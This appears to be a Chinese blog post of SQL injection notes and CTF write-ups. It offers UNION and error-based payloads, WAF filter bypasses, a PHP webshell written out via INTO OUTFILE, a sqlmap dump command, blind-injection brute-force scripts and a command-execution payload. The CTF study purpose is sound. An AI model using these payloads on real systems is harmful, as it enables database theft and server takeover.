@@ -1,0 +1,201 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="userq"><meta name="renderer" content="webkit"><meta name="copyright" content="userq"><meta name="keywords" content="MyBlog"><meta name="description" content="MyBlog"><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>sql注入 · Mr.cheng's Blog</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicon.ico"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
+  "use strict";
+  // rel=preload support test
+  if( !w.loadCSS ){
+    w.loadCSS = function(){};
+  }
+  // define on the loadCSS obj
+  var rp = loadCSS.relpreload = {};
+  // rel=preload feature support test
+  // runs once and returns a function for compat purposes
+  rp.support = (function(){
+    var ret;
+    try {
+      ret = w.document.createElement( "link" ).relList.supports( "preload" );
+    } catch (e) {
+      ret = false;
+    }
+    return function(){
+      return ret;
+    };
+  })();
+
+  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+  // then change that media back to its intended value on load
+  rp.bindMediaToggle = function( link ){
+    // remember existing media attr for ultimate state, or default to 'all'
+    var finalMedia = link.media || "all";
+
+    function enableStylesheet(){
+      link.media = finalMedia;
+    }
+
+    // bind load handlers to enable media
+    if( link.addEventListener ){
+      link.addEventListener( "load", enableStylesheet );
+    } else if( link.attachEvent ){
+      link.attachEvent( "onload", enableStylesheet );
+    }
+
+    // Set rel and non-applicable media type to start an async request
+    // note: timeout allows this to happen async to let rendering continue in IE
+    setTimeout(function(){
+      link.rel = "stylesheet";
+      link.media = "only x";
+    });
+    // also enable media after 3 seconds,
+    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+    setTimeout( enableStylesheet, 3000 );
+  };
+
+  // loop through link elements in DOM
+  rp.poly = function(){
+    // double check this to prevent external calls from running
+    if( rp.support() ){
+      return;
+    }
+    var links = w.document.getElementsByTagName( "link" );
+    for( var i = 0; i < links.length; i++ ){
+      var link = links[ i ];
+      // qualify links to those with rel=preload and as=style attrs
+      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+        // prevent rerunning on link
+        link.setAttribute( "data-loadcss", true );
+        // bind listeners to toggle media back
+        rp.bindMediaToggle( link );
+      }
+    }
+  };
+
+  // if unsupported, run the polyfill
+  if( !rp.support() ){
+    // run once at least
+    rp.poly();
+
+    // rerun poly on an interval until onload
+    var run = w.setInterval( rp.poly, 500 );
+    if( w.addEventListener ){
+      w.addEventListener( "load", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    } else if( w.attachEvent ){
+      w.attachEvent( "onload", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    }
+  }
+
+
+  // commonjs
+  if( typeof exports !== "undefined" ){
+    exports.loadCSS = loadCSS;
+  }
+  else {
+    w.loadCSS = loadCSS;
+  }
+}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="MyBlog" type="application/atom+xml">
+</head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/cat.png"></div><!--.profile-saying
+  i.fa.fa-comment
+  .saying--><div class="cxo-profile-inner"><div class="profile-name">userq</div><div class="profile-signature">for me</div><div class="friends"><div>FRIENDS</div><span><a href="//1768161086.github.io/" target="_black">friendA</a></span><span><a href="//github.com/" target="_black">friendB</a></span><span><a href="//github.com/" target="_black">friendC</a></span></div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">Mr.cheng's Blog</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">sql注入</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2025-01-29</span></span><span class="post-intro-tags"><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="web"> web</a><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="原创"> 原创</a><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="sql注入"> sql注入</a></span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><blockquote>
+<p>sql注入相关命令介绍</p>
+</blockquote>
+<h1 id="1-sql相关查询命令"><a href="#1-sql相关查询命令" class="headerlink" title="1.sql相关查询命令"></a>1.sql相关查询命令</h1><p>1.查询字段数：</p>
+<p>1’ order by 3#</p>
+<p>2.查询数据库信息：</p>
+<p>1’ union select user(),version(),database()#</p>
+<p>3.获取表名</p>
+<p>1’ union select 1,2,group_concat(table_name)from information_schema.tables where table_schema&#x3D;’库名’</p>
+<p>4.获取列名</p>
+<p>1’ union select 1,2,group_concat(column_name)from information_schema.columns where table_name&#x3D;’表名’</p>
+<p>5.查 库:select schema_name from information_schema.schemata</p>
+<p>6.查 表： select table_name from information_schema.tables where table_schema&#x3D;库名</p>
+<p>7.查 列： select column_name from information_schema.columns where table_name&#x3D;表名</p>
+<p>8.查数据： select 列名 from 库名.表名</p>
+<p>（1）user() 返回当前使用数据库的用户，也就是网站配置文件中连接数据库的账号 （2）version() 返回当前数据库的版本 </p>
+<p>（2）version() 返回当前数据库的版本 </p>
+<p>（3）database() 返回当前使用的数据库，只有在use命令选择一个数据库之后，才能查到 </p>
+<p>（4）group_concat() 把数据库中的某列数据或某几列数据合并为一个字符串 </p>
+<p>（5）@@datadir 数据库路径 </p>
+<p>（6）@@version_compile_os 操作系统版本</p>
+<h2 id="2-相关过滤绕过方法"><a href="#2-相关过滤绕过方法" class="headerlink" title="2.相关过滤绕过方法"></a>2.相关过滤绕过方法</h2><p>1.过滤数字0-9：</p>
+<p>查询表名用字母替换0’ union select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(group_concat(table_name),’1’,’A’),’2’,’B’),’3’,’C’),’4’,’D’),’5’,’E’),’6’,’F’),’7’,’G’),’8’,’H’),’9’,’I’),’0’,’J’),’a’ from information_schema.tables where table_schema&#x3D;database()–+</p>
+<p>最后得出flag用脚本还原替换：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">origin = &#x27;ctfshow&#123;eIdGcBcc-cACA-DEIF-aGcB-aAJGdJddGBCe&#125;&#x27;</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">repl = &#123;</span><br><span class="line">        &#x27;A&#x27;: &#x27;1&#x27;,</span><br><span class="line">        &#x27;B&#x27;: &#x27;2&#x27;,</span><br><span class="line">        &#x27;C&#x27;: &#x27;3&#x27;,</span><br><span class="line">        &#x27;D&#x27;: &#x27;4&#x27;,</span><br><span class="line">        &#x27;E&#x27;: &#x27;5&#x27;,</span><br><span class="line">        &#x27;F&#x27;: &#x27;6&#x27;,</span><br><span class="line">        &#x27;G&#x27;: &#x27;7&#x27;,</span><br><span class="line">        &#x27;H&#x27;: &#x27;8&#x27;,</span><br><span class="line">        &#x27;I&#x27;: &#x27;9&#x27;,</span><br><span class="line">        &#x27;J&#x27;: &#x27;0&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">for k, v in repl.items():</span><br><span class="line">    origin = origin.replace(k, v)</span><br><span class="line">flag += origin</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+
+<p>2.过滤ascii字母数字符号</p>
+<p>-1’ union select 1,group_concat(password) from ctfshow_user5 into outfile ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.txt’ –+，之后访问flag.txt或者用脚本</p>
+<p>3.过滤空格</p>
+<p>可用&#x2F;**&#x2F;、%09、%0a、%0b、%0c.、%0d、0’or(id&#x3D;26)and’1’&#x3D;’1、（）。</p>
+<p>4.过滤#</p>
+<p>可用%23。注释可用–+或#或–%0c或 – -。%23过滤：or’1’&#x3D;’  注释或– </p>
+<p>5.&#x3D;号被过滤</p>
+<p>可以用like来绕过。</p>
+<p>6.substring与mid被过滤</p>
+<p>可以用right与left来绕过</p>
+<p>7.输出被限制的时候可以利用文件写入操作。如过滤掉了ascii从0到127的字符</p>
+<p>-1’ union select  username,password from ctfshow_user5 into outfile “&#x2F;var&#x2F;www&#x2F;html&#x2F;1.txt”–+：使用into outfile ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;‘将信息输入到文件中去，然后访问对应文件</p>
+<p>8.过滤 ‘ “ &#96;</p>
+<p>可用roght join绕过：tableName&#x3D;<code>ctfshow_user</code> as a right join ctfshow_user as b on substr(b.pass,1,1)regexp(char(46))</p>
+<p>9.重命名字段</p>
+<p>rename table <code>words</code> to words2; </p>
+<p>10修改字段数据类型：</p>
+<p>alter table words change flag id varchar(100);</p>
+<p>11.union select被过滤</p>
+<p>可双写绕过：ununionion seselectlect </p>
+<p>12.万能密码：1’||1–%0c</p>
+<p>13.like 结合 % 进行通配绕过</p>
+<p>% 可以匹配任何数目的字符 ；_ 可以匹配单个字符</p>
+<p>14.过滤order by,information_schema：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;/**/union/**/select/**/1,database(),group_concat(table_name),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=&quot;web1&quot;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>使用无列名注入查询字段信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;/**/union/**/select/**/1,database(),(select/**/group_concat(b)/**/from/**/(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;</span><br></pre></td></tr></table></figure>
+
+<h1 id="3-报错注入"><a href="#3-报错注入" class="headerlink" title="3.报错注入"></a>3.报错注入</h1><p>1.报错注入两个函数：</p>
+<p>（1）updatexml(xml_target, xpath_expr, new_xml)第一个参数：是string格式，为XML文档对象的名称。第二个参数：代表路径，Xpath格式的字符串。第三个参数：string格式，替换查找到的符合条件的数据。第二个参数跟extractvalue函数的第二个参数一样，因此也可利用且利用方式相同。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,2,updatexml(1,concat(0x7e,database(),0x7e),1)#</span><br></pre></td></tr></table></figure>
+
+<p>（2）extractvalue(xml_frag, xpath_expr)接受两个字符串参数，一个XML标记片段xml_frag和一个XPath表达式xpath_expr（也称为定位器）；它返回CDATA第一个文本节点的text（），该节点是XPath表达式匹配的元素的子元素。第一个参数可以传入目标xml文档，第二个参数是用Xpath路径法表示的查找路径。作用：从目标xml中返回包含所查询值的字符串</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,2,extractvalue(1,concat(&#x27;~&#x27;,(select database())))#</span><br></pre></td></tr></table></figure>
+
+<p>2.区别：</p>
+<p>^可来更换or,然后不用updatexml()，而是使用：extractvalue()原理都是一样的。</p>
+<h1 id="4-handler用法"><a href="#4-handler用法" class="headerlink" title="4..handler用法"></a>4..handler用法</h1><p>在MySQL中，handler也可以执行查询：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">handler tbl_name OPEN [ [AS] alias]</span><br><span class="line"></span><br><span class="line">handler tbl_name READ index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...)</span><br><span class="line"></span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line"></span><br><span class="line">handler tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;</span><br><span class="line"></span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line"></span><br><span class="line">handler tbl_name READ &#123; FIRST | NEXT &#125;</span><br><span class="line"></span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line"></span><br><span class="line">handler tbl_name CLOSE</span><br></pre></td></tr></table></figure>
+
+<h1 id="5-写入shell文件"><a href="#5-写入shell文件" class="headerlink" title="5.写入shell文件"></a>5.写入shell文件</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">userid=a&#x27; union select &quot;&lt;?php eval($_POST[1]);?&gt;&quot; into outfile &quot;/var/www/html/shell.php&quot;%23&amp;userpwd=1</span><br></pre></td></tr></table></figure>
+
+<h1 id="6-sqlmap跑"><a href="#6-sqlmap跑" class="headerlink" title="6.sqlmap跑"></a>6.sqlmap跑</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">python .\sqlmap.py -u &quot;http://fddf2115-423b-4701-b77b-8ef5f2194ee7.challenge.ctf.show:8080/&quot; --form --batch --dump</span><br><span class="line"></span><br><span class="line"># 参数 </span><br><span class="line">--batch 批处理，在检测过程中会问用户一些问题，使用这个参数统统使用默认值</span><br><span class="line">--forms 在目标URL上解析和测试表单</span><br><span class="line">--dump 查询指定范围的全部数据</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="web181-1-and-0-or-1满足两边的条件返回true"><a href="#web181-1-and-0-or-1满足两边的条件返回true" class="headerlink" title="web181:1 and 0 or 1满足两边的条件返回true"></a>web181:1 and 0 or 1满足两边的条件返回true</h2><p>username !&#x3D;’flag’ and id &#x3D; ‘“.$_GET[‘id’].”‘ limit 1;”;</p>
+<p>payload:<code>-1&#39;||username=&#39;flag</code></p>
+<h2 id="web183-select不能用，就只能选择布尔盲注或者时间盲注了。"><a href="#web183-select不能用，就只能选择布尔盲注或者时间盲注了。" class="headerlink" title="web183:select不能用，就只能选择布尔盲注或者时间盲注了。"></a>web183:select不能用，就只能选择布尔盲注或者时间盲注了。</h2><p>可以用布尔盲注：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tableName=`ctfshow_user`where`pass`like&#x27;ctfshow&#123;%&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">url=&quot;http://5b285b83-8642-4556-b1cc-ca435d196f99.challenge.ctf.show/select-waf.php&quot;</span><br><span class="line"></span><br><span class="line">flagstr=&quot;ctfshow&#123;qeryuipadgjklzxvbnm0123456789-&#125;_&quot;</span><br><span class="line">flag=&quot;&quot;</span><br><span class="line">for i in range(0,34):</span><br><span class="line">    for x in flagstr:</span><br><span class="line">        data=&#123;</span><br><span class="line">            &quot;tableName&quot;:&quot;`ctfshow_user`where`pass`regexp(\&quot;ctfshow&#123;&#125;\&quot;)&quot;.format(flag+x)</span><br><span class="line">            #&quot;tableName&quot;:&quot;`ctfshow_user`where`pass`like\&#x27;ctfshow&#123;&#125;%\&#x27;&quot;.format(flag+x)</span><br><span class="line">        &#125;</span><br><span class="line">        response=requests.post(url,data=data)</span><br><span class="line">        #有并发数量限制的题目，就睡一段时间</span><br><span class="line">        time.sleep(0.3)</span><br><span class="line">        if response.text.find(&quot;$user_count = 1;&quot;)&gt;0:</span><br><span class="line">            print(&quot;++++++++++++++++ &#123;&#125; is right&quot;.format(x))</span><br><span class="line">            flag+=x</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            continue</span><br><span class="line">    print(&quot;ctfshow&quot;+flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="web184-where可以用having代替，单双引号可以用-括号-十六进制。"><a href="#web184-where可以用having代替，单双引号可以用-括号-十六进制。" class="headerlink" title="web184:where可以用having代替，单双引号可以用 括号+十六进制。"></a>web184:where可以用having代替，单双引号可以用 括号+十六进制。</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">url=&quot;http://24873af7-39c6-4235-85e2-f6433b80f182.challenge.ctf.show/select-waf.php&quot;</span><br><span class="line"></span><br><span class="line">flagstr=&quot;ctfshow&#123;qeryuipadgjklzxvbnm0123456789-&#125;_&quot;   #40</span><br><span class="line">flag=&quot;&quot;</span><br><span class="line">for i in range(0,40):</span><br><span class="line">    for x in flagstr:</span><br><span class="line">        data=&#123;</span><br><span class="line">            &quot;tableName&quot;:&quot;ctfshow_user group by pass having pass like 0x63746673686f777b&#123;&#125;25&quot;.format(&quot;&quot;.join(hex(ord(i))[2:] for i in flag+x))</span><br><span class="line">        &#125;</span><br><span class="line">        #print(data)</span><br><span class="line">        response=requests.post(url,data=data)</span><br><span class="line">        #有并发数量限制的，就睡一段时间</span><br><span class="line">        time.sleep(0.3)</span><br><span class="line">        if response.text.find(&quot;$user_count = 1;&quot;)&gt;0:</span><br><span class="line">            print(&quot;++++++++++++++++ &#123;&#125; is right&quot;.format(x))</span><br><span class="line">            flag+=x</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            continue</span><br><span class="line">    print(&quot;ctfshow&#123;&quot;+flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="web185-数字、尖括号，-、-被过滤了，就要考虑如何构造纯字母的匹配。"><a href="#web185-数字、尖括号，-、-被过滤了，就要考虑如何构造纯字母的匹配。" class="headerlink" title="web185:数字、尖括号，^、%被过滤了，就要考虑如何构造纯字母的匹配。"></a>web185:数字、尖括号，<code>^</code>、<code>%</code>被过滤了，就要考虑如何构造纯字母的匹配。</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">def formatString(str):</span><br><span class="line">    temp=&quot;concat(&quot;</span><br><span class="line">    for x in str:</span><br><span class="line">        tip=0</span><br><span class="line">        if x in string.digits:</span><br><span class="line">            tmp=int(x)</span><br><span class="line">        else:</span><br><span class="line">            tip=1</span><br><span class="line">            temp+=&quot;char(&quot;</span><br><span class="line">            tmp=ord(x)</span><br><span class="line">        if tmp == 0:</span><br><span class="line">            temp+=&quot;false&quot;</span><br><span class="line">        else:</span><br><span class="line">            temp_d=&quot;(&quot;</span><br><span class="line">            for i in range(0,tmp):</span><br><span class="line">                temp_d+=&quot;true+&quot;</span><br><span class="line">            temp_d=temp_d[:-1]+&quot;)&quot;</span><br><span class="line">            if tip==1:</span><br><span class="line">                temp_d+=&quot;)&quot;</span><br><span class="line">            temp+=temp_d</span><br><span class="line">        temp+=&quot;,&quot;</span><br><span class="line">    temp=temp[:-1]+&quot;)&quot;</span><br><span class="line">    return temp</span><br><span class="line"></span><br><span class="line">#print(formatString(&quot;0x63746673686f777b&quot;))</span><br><span class="line"></span><br><span class="line">url=&quot;http://d2f644f5-968d-4301-b037-267c7b183b0e.challenge.ctf.show/select-waf.php&quot;</span><br><span class="line">#dic的顺序可以改一下！我是懒得改了！改顺序可以提高效率！！！</span><br><span class="line">dic=&quot;ctfshow&#123;qeryuipadgjklzxvbnm0123456789-&#125;_&quot;</span><br><span class="line">flag=&quot;ctfshow&#123;&quot;</span><br><span class="line">for i in range(0,40):</span><br><span class="line">    for x in dic:</span><br><span class="line">        data=&#123;</span><br><span class="line">            &quot;tableName&quot;:&quot;ctfshow_user group by pass having pass regexp(&#123;&#125;)&quot;.format(formatString(flag+x))</span><br><span class="line">        &#125;</span><br><span class="line">        #print(data)</span><br><span class="line">        response=requests.post(url,data=data)</span><br><span class="line">        time.sleep(0.3)</span><br><span class="line">        if response.text.find(&quot;$user_count = 1;&quot;)&gt;0:</span><br><span class="line">            print(&quot;[**] &#123;&#125; is right&quot;.format(x))</span><br><span class="line">            flag+=x</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            #print(&quot;[--] &#123;&#125; is wrong&quot;.format(x))</span><br><span class="line">            continue</span><br><span class="line">    print(&quot;[flag]:&quot;+flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="web187-password-md5-POST-password-true"><a href="#web187-password-md5-POST-password-true" class="headerlink" title="web187.$password = md5($_POST[&#39;password&#39;],true);"></a>web187.<code>$password = md5($_POST[&#39;password&#39;],true);</code></h2><p>，将md5函数的第二参数设置为了true。</p>
+<p><code>ffifdyop</code>是一个特殊的字符串，类似万能密码。还有129581926211651571912466741651878684928也可以达到同样的效果。sql语句就构成了<code>1 and 0 or 1</code>这样的操作</p>
+<h2 id="Basectf-Sql-Inject-or-RCE"><a href="#Basectf-Sql-Inject-or-RCE" class="headerlink" title="Basectf Sql Inject or RCE"></a>Basectf <strong><strong>Sql Inject or RCE</strong></strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$sql = $_GET[&#x27;sql&#x27;];</span><br><span class="line">if (preg_match(&#x27;/se|ec|st|;|@|delete|into|outfile/i&#x27;, $sql)) &#123;</span><br><span class="line">    die(&quot;你知道的，不可能有sql注入&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if (preg_match(&#x27;/&quot;|\$|`|\\\\/i&#x27;, $sql)) &#123;</span><br><span class="line">    die(&quot;你知道的，不可能有RCE&quot;);</span><br><span class="line">&#125;</span><br><span class="line">$query = &quot;mysql -u root -p123456 -e \&quot;use ctf;select &#x27;ctfer! You can\\&#x27;t succeed this time! hahaha&#x27;; -- &quot; . $sql . &quot;\&quot;&quot;;</span><br><span class="line">system($query);</span><br></pre></td></tr></table></figure>
+
+<p>system被过滤，无法再像上面那题一样进行命令执行，但我们发现sql注入过滤中的del变成了delete，用我们的小脑瓜想一想，这道题还是考察sql注入<br>select被过滤，那可以用handler来进行堆叠注入，然而分号也被过滤。<br>但是mysql中有一个关键字叫DELIMITER，它可以改变语句结束的分隔符，可以将分号改成其他<br>因此我们就可以对此进行堆叠注入</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sql=%0ADELIMITER m%0Ahandler flag openm%0Ahandler flag read nextm</span><br></pre></td></tr></table></figure>
+
+<h3 id="RCE-or-Sql-Inject"><a href="#RCE-or-Sql-Inject" class="headerlink" title="RCE or Sql Inject"></a>RCE or Sql Inject</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$sql = $_GET[&#x27;sql&#x27;];</span><br><span class="line">if (preg_match(&#x27;/se|ec|;|@|del|into|outfile/i&#x27;, $sql)) &#123;</span><br><span class="line">    die(&quot;你知道的，不可能有sql注入&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if (preg_match(&#x27;/&quot;|\$|`|\\\\/i&#x27;, $sql)) &#123;</span><br><span class="line">    die(&quot;你知道的，不可能有RCE&quot;);</span><br><span class="line">&#125;</span><br><span class="line">$query = &quot;mysql -u root -p123456 -e \&quot;use ctf;select &#x27;ctfer! You can\\&#x27;t succeed this time! hahaha&#x27;; -- &quot; . $sql . &quot;\&quot;&quot;;</span><br><span class="line">system($query);</span><br></pre></td></tr></table></figure>
+
+<p>这里del into select这些都没法用了，sql注入是不太现实了<br>同时他题目的提示也给到了我们RCE，mysql远程连接和命令行操作，和让我们输入一个问号。<br>这道题可能是考察mysql命令行中的一些操作<br>在mysql命令行中输入?试试</p>
+<p>可以发现里面有一个system，可以通过mysql命令行直接执行系统命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$query = &quot;mysql -u root -p123456 -e &quot;use ctf;select &#x27;ctfer! You can\&#x27;t succeed this time! hahaha&#x27;; -- &quot; . $sql . &quot;&quot;&quot;;</span><br><span class="line">我们发现这里面有个-- ，也就是注释符，因此我们还需要绕过一下注释</span><br><span class="line">%0a换行即可绕过</span><br><span class="line">env:查看所有环境变量</span><br></pre></td></tr></table></figure>
+
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%0asystem env</span><br></pre></td></tr></table></figure>
+
+
